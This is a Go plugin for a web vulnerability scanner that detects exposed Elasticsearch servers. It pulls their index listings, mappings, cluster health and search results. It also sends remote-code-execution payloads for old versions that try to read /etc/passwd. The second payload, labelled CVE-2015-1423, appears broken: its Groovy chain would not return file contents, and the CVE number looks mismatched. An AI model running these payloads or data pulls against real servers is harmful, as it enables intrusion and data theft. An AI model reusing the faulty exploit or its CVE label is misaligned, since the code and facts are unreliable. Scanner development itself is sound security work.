/**
* @Author: shaochuyu
* @Date: 6/16/2026
 */
package esaudit

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"wscan/core/http"
	"wscan/core/model"
	"wscan/core/plugins/base"
	logger "wscan/core/utils/log"
)

// Config Elasticsearch 审计插件配置
type Config struct {
	base.PluginBaseConfig `json:",inline" yaml:",inline"`
}

func (c *Config) BaseConfig() *base.PluginBaseConfig {
	return &c.PluginBaseConfig
}

// ESAudit Elasticsearch 审计插件
type ESAudit struct {
	base.PluginMixinInitConfig
	base.PluginMixinClose
}

func (*ESAudit) Close() error { return nil }

func (*ESAudit) DefaultConfig() base.PluginConfigInterface {
	return &Config{
		PluginBaseConfig: base.PluginBaseConfig{Name: "es-audit", Enabled: true},
	}
}

func (p *ESAudit) GetConfig() base.PluginConfigInterface {
	return p.PluginMixinInitConfig.GetConfig()
}

func (p *ESAudit) Init(ctx context.Context, pci base.PluginConfigInterface, ab *base.ApolloBase) error {
	logger.Debug("ESAudit plugin init")
	return p.PluginMixinInitConfig.Init(ctx, pci, ab)
}

// doRequest sends an HTTP request and returns the request, response, and error.
func doRequest(apollo *base.Apollo, method, rawURL string) (*http.Request, *http.Response, error) {
	req, err := http.NewRequest(method, rawURL, nil)
	if err != nil {
		return nil, nil, err
	}
	resp, err := apollo.HTTPClient.Respond(context.Background(), req)
	if err != nil {
		return nil, nil, err
	}
	return req, resp, nil
}

// doRequestWithJSON sends a POST request with JSON body.
func doRequestWithJSON(apollo *base.Apollo, rawURL string, body string) (*http.Request, *http.Response, error) {
	req, err := http.NewRequest("POST", rawURL, strings.NewReader(body))
	if err != nil {
		return nil, nil, err
	}
	req.SetHeader("Content-Type", "application/json")
	resp, err := apollo.HTTPClient.Respond(context.Background(), req)
	if err != nil {
		return nil, nil, err
	}
	return req, resp, nil
}

// esInfo represents the basic info returned by Elasticsearch / endpoint.
type esInfo struct {
	Name        string `json:"name"`
	ClusterName string `json:"cluster_name"`
	Version     struct {
		Number string `json:"number"`
	} `json:"version"`
	Tagline string `json:"tagline"`
}

// detectESFingerprint checks if the target is an Elasticsearch instance.
func detectESFingerprint(apollo *base.Apollo, baseURL string) (*esInfo, *http.Request, *http.Response) {
	req, resp, err := doRequest(apollo, "GET", baseURL)
	if err != nil || resp.StatusCode != 200 {
		return nil, nil, nil
	}
	body := resp.Text
	if !strings.Contains(body, `"tagline"`) && !strings.Contains(body, "You Know, for Search") {
		return nil, nil, nil
	}
	var info esInfo
	if err := json.Unmarshal([]byte(body), &info); err != nil {
		// Try relaxed check if JSON parsing fails
		if strings.Contains(body, "You Know, for Search") {
			info.Tagline = "You Know, for Search"
		} else {
			return nil, nil, nil
		}
	}
	return &info, req, resp
}

// makeVuln creates and outputs a vulnerability.
func makeVuln(apollo *base.Apollo, req *http.Request, resp *http.Response, vulnID, category, payload string, extra map[string]any) {
	v := apollo.NewWebVuln(req, resp, nil)
	if v == nil {
		return
	}
	v.SetTargetURL(req.URL())
	v.Payload = payload
	if extra != nil {
		for k, val := range extra {
			v.Extra[k] = val
		}
	}
	apollo.OutputVuln(v)
}

func (p *ESAudit) Fingers() []*base.Finger {
	return []*base.Finger{
		// Elasticsearch 暴露检测
		{
			Channel: "website",
			Binding: &model.VulnBinding{
				ID:       "es_exposed",
				Plugin:   "esaudit",
				Category: "es_exposed",
				Severity: model.SeverityHigh,
			},
			CheckAction: func(ctx context.Context, apollo *base.Apollo) error {
				flow := apollo.GetTargetFlow()
				if flow == nil || flow.Request == nil {
					return fmt.Errorf("no flow available")
				}
				return nil
			},
			ExecAction: func(ctx context.Context, apollo *base.Apollo) error {
				flow := apollo.GetTargetFlow()
				if flow == nil || flow.Request == nil {
					return nil
				}
				baseURL := flow.Request.URL().String()

				// Step 1: Fingerprint detection
				info, req, resp := detectESFingerprint(apollo, baseURL)
				if info == nil {
					return nil
				}

				extra := map[string]any{}
				if info.Name != "" {
					extra["es_name"] = info.Name
				}
				if info.ClusterName != "" {
					extra["cluster_name"] = info.ClusterName
				}
				if info.Version.Number != "" {
					extra["version"] = info.Version.Number
				}
				makeVuln(apollo, req, resp, "es_exposed", "es_exposed", "Elasticsearch instance exposed", extra)

				// Step 2: Check exposed indices
				indicesURL := http.UrlJoinPath(baseURL, "/_cat/indices")
				indicesReq, indicesResp, err := doRequest(apollo, "GET", indicesURL)
				if err == nil && indicesResp.StatusCode == 200 && len(indicesResp.Text) > 0 {
					makeVuln(apollo, indicesReq, indicesResp, "es_indices_exposed", "es_indices_exposed",
						"/_cat/indices accessible", map[string]any{"indices_data": indicesResp.Text})
				}

				mappingURL := http.UrlJoinPath(baseURL, "/_all/_mapping")
				mappingReq, mappingResp, err := doRequest(apollo, "GET", mappingURL)
				if err == nil && mappingResp.StatusCode == 200 && len(mappingResp.Text) > 0 {
					makeVuln(apollo, mappingReq, mappingResp, "es_mapping_exposed", "es_mapping_exposed",
						"/_all/_mapping accessible", map[string]any{"mapping_data": mappingResp.Text})
				}

				// Step 3: Check cluster health
				healthURL := http.UrlJoinPath(baseURL, "/_cluster/health")
				healthReq, healthResp, err := doRequest(apollo, "GET", healthURL)
				if err == nil && healthResp.StatusCode == 200 && len(healthResp.Text) > 0 {
					makeVuln(apollo, healthReq, healthResp, "es_cluster_health_exposed", "es_cluster_health_exposed",
						"/_cluster/health accessible", map[string]any{"health_data": healthResp.Text})
				}

				// Step 4: Check _search read access
				searchURL := http.UrlJoinPath(baseURL, "/_search")
				searchReq, searchResp, err := doRequest(apollo, "GET", searchURL)
				if err == nil && searchResp.StatusCode == 200 {
					makeVuln(apollo, searchReq, searchResp, "es_search_exposed", "es_search_exposed",
						"/_search accessible", map[string]any{"search_data": searchResp.Text})
				}

				// Step 5: CVE-2014-3120 - Dynamic scripting enabled (older ES versions)
				if info.Version.Number != "" {
					versionParts := strings.Split(info.Version.Number, ".")
					if len(versionParts) >= 1 {
						major := versionParts[0]
						if major == "1" {
							// Test MVEL script execution via _search
							cveScript := `{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"/etc/passwd":{"script":"import java.util.*;\nimport java.io.*;\nnew Scanner(new File(\"/etc/passwd\")).useDelimiter(\"\\\\Z\").next();"}}}`
							scriptURL := http.UrlJoinPath(baseURL, "/_search")
							cveReq, cveResp, err := doRequestWithJSON(apollo, scriptURL, cveScript)
							if err == nil && cveResp.StatusCode == 200 {
								if strings.Contains(cveResp.Text, "root:") {
									makeVuln(apollo, cveReq, cveResp, "CVE-2014-3120", "es_rce",
										"Dynamic scripting RCE (CVE-2014-3120)", map[string]any{
											"cve":         "CVE-2014-3120",
											"description": "Elasticsearch allows dynamic scripting, enabling remote code execution",
										})
								}
							}
						}
					}
				}

				// Step 6: CVE-2015-1423 - Groovy sandbox bypass
				if info.Version.Number != "" {
					versionParts := strings.Split(info.Version.Number, ".")
					if len(versionParts) >= 2 {
						major := versionParts[0]
						minor := versionParts[1]
						// Affected: 1.3.0 - 1.4.x
						if major == "1" && (minor == "3" || minor == "4") {
							groovyScript := `{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"/etc/passwd":{"script":"java.lang.Math.class.forName(\"java.io.BufferedReader\").class.forName(\"java.io.FileReader\").class.forName(\"java.io.File\").newInstance(\"/etc/passwd\")"}}}`
							scriptURL := http.UrlJoinPath(baseURL, "/_search")
							cveReq, cveResp, err := doRequestWithJSON(apollo, scriptURL, groovyScript)
							if err == nil && cveResp.StatusCode == 200 {
								if strings.Contains(cveResp.Text, "root:") {
									makeVuln(apollo, cveReq, cveResp, "CVE-2015-1423", "es_rce",
										"Groovy sandbox bypass RCE (CVE-2015-1423)", map[string]any{
											"cve":         "CVE-2015-1423",
											"description": "Elasticsearch Groovy sandbox bypass allows remote code execution",
										})
								}
							}
						}
					}
				}

				return nil
			},
		},
	}
}
